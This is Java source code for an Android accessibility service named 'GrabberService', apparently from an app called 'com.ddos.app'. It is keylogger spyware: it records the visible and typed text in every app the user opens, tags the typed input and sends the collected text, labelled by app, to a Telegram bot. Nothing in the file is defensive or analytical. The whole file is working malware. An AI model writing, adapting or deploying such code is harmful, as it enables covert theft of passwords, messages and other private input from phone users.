package com.ddos.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class GrabberService extends AccessibilityService {
    private final StringBuilder buf = new StringBuilder();
    private String lastPkg = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        try {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (!pkg.equals(lastPkg)) { flush(); lastPkg = pkg; }

            AccessibilityNodeInfo src = e.getSource();
            if (src != null && src.getText() != null) {
                String t = src.getText().toString();
                if (t.length() > 0 && !t.equals(buf.toString())) {
                    buf.append(t).append(" ");
                    if (buf.length() > 300) flush();
                }
            }
            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                List<CharSequence> t = e.getText();
                if (t != null && !t.isEmpty())
                    buf.append("[in]").append(t.get(0)).append(" ");
            }
        } catch (Exception ignored) {}
    }

    private void flush() {
        if (buf.length() == 0) return;
        String out = "\u2328\uFE0F <b>Input \u2014 " + lastPkg + "</b>\n" + buf;
        TelegramBot bot = new TelegramBot();
        bot.init(getApplicationContext());
        bot.sendMessage(out.length() > 3800 ? out.substring(0, 3800) : out);
        buf.setLength(0);
    }

    @Override public void onInterrupt() {}
}
